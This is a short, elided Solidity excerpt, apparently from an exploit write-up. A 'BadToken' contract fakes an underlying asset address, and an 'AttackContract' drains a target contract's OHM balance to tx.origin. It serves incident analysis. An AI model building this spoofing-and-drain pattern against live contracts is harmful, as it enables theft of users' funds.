...
contract BadToken {
    ...
    function underlying() external pure returns (address) {
        return address(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);
    }
}
...
contract AttackContract {
    ...
    function startAttack() external {
        ...
        uint256 targetBalance = OHM.balanceOf(address(targetContract));
        ...
        OHM.transfer(tx.origin, targetBalance);
    }
}